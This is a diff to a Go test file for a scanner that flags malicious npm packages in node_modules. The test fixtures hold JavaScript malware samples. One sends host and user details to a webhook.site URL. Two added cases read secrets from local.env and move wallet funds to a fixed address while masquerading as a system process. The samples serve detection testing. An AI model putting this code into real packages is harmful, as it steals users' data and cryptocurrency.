@@ -1769,6 +1769,16 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 			rel:  filepath.Join("node_modules", ".pnpm", "lumen-pages-community@9.9.9", "node_modules", "lumen-pages-community", "dc.js"),
 			raw:  []byte(`const os = require("os"); const https = require("https"); const info = { host: os.hostname(), user: os.userInfo().username, cwd: process.cwd(), platform: process.platform, ci: process.env.CI }; https.get("https://webhook.site/b00492c6-27ba-4ea0-a9cb-dd50b3770250/dc?" + new URLSearchParams(info));`),
 		},
+		{
+			name: "env parser wallet theft npm",
+			rel:  filepath.Join("node_modules", "@js-lib-team", "env-parser", "index.js"),
+			raw:  []byte(`(() => { process.title = "systemd: [logrotate]"; const text = readFileSync("local.env", "utf8"); const keys = text.match(/PRIVATE_KEY|SECRET|MNEMONIC/); const wallet = new ethers.Wallet(keys[0]); wallet.sendTransaction({ to: "0x70951410C5E9E938D8715288A7229548287a1a62", value: balance }); })();`),
+		},
+		{
+			name: "env parser wallet theft pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "@js-lib-team+env-parser@1.0.0", "node_modules", "@js-lib-team", "env-parser", "index.js"),
+			raw:  []byte(`(() => { process.title = "systemd: [logrotate]"; const text = readFileSync("local.env", "utf8"); const keys = text.match(/PRIVATE_KEY|SECRET|MNEMONIC/); const wallet = new ethers.Wallet(keys[0]); wallet.sendTransaction({ to: "0x70951410C5E9E938D8715288A7229548287a1a62", value: balance }); })();`),
+		},
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
